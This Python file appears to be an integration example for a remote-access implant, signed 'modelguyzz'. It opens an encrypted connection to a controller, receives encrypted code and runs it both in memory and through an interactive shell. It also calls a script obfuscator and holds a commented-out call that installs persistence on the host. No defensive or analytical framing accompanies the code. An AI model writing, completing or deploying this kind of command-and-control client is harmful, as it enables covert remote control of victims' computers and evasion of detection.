# full_integration_example.py
import asyncio
import os
from async_networking_engine import AsyncNetworkingEngine
from e2ee_messaging_protocol import E2EEMessagingProtocol
from interactive_shell_wrapper import InteractiveShellWrapper
from in_memory_executor import execute_in_memory
from python_obfuscator import obfuscate_script
from persistence_installer import install_persistence

# 1️ Setup encryption
shared_key = os.urandom(32)
crypto = E2EEMessagingProtocol(shared_key)

# 2️ Setup networking
engine = AsyncNetworkingEngine("127.0.0.1", 9999)

async def main():
    asyncio.create_task(engine.connect())
    await engine._connected.wait()

    # 3️ Send a message
    encrypted_msg = crypto.encrypt_message("Hello, Server!")
    await engine.send_message(encrypted_msg)

    # 4️ Receive and execute incoming encrypted code
    while True:
        enc_msg = await engine.receive_message()
        try:
            code = crypto.decrypt_message(enc_msg)

            # Option A: Run in memory
            result = execute_in_memory(code)
            print("Memory output:", result)

            # Option B: Run via shell
            shell = InteractiveShellWrapper()
            shell.execute_command(code)
            import time; time.sleep(0.1)
            while True:
                out = shell.get_stdout(timeout=0.1)
                if not out: break
                print("Shell output:", out)

        except Exception as e:
            print("Error executing message:", e)

# 5️ Obfuscate a sample script
sample_script = 'print("This is secret!")'
print("Obfuscated script:\n", obfuscate_script(sample_script))

# 6️ Optional: install persistence
# install_persistence(os.path.abspath(__file__), "MyPersistentTool")
# made by modelguyzz
asyncio.run(main())
